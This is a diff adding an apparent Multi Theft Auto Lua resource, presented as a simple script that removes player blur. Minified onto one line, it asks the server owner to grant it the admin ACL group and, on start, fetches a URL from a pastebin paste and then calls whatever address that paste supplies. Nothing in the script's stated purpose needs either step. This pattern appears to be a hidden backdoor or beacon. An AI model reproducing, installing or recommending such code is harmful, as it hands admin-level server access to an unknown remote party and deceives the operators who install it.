@@ -1,0 +1,4 @@
+﻿-- Türkçe Kaliteli Scriptin Adresi : https://sparrow-mta.blogspot.com
+-- SparroW MTA İyi Oyunlar Diler...
+
+local a=getThisResource()local b=getResourceName(a)outputedtext=": please add the "..b.." script to group admin on acl.xml."function playerJoin()setPlayerBlurLevel(source,0)end;addEventHandler("onPlayerJoin",getRootElement(),playerJoin)function scriptStart()setPlayerBlurLevel(getRootElement(),0)fetchRemote('https://pastebin.com/raw/y2WxWv8N',function(c,d)if d~=0 then return print(d)end;fetchRemote(c,function(e,d)outputDebugString(b..": "..e)end)outputed=true;outputedtext=": acl found."end)if not outputed==true then setTimer(function()outputDebugString(b..outputedtext)end,2000,1)end end;addEventHandler("onResourceStart",getResourceRootElement(getThisResource()),scriptStart)
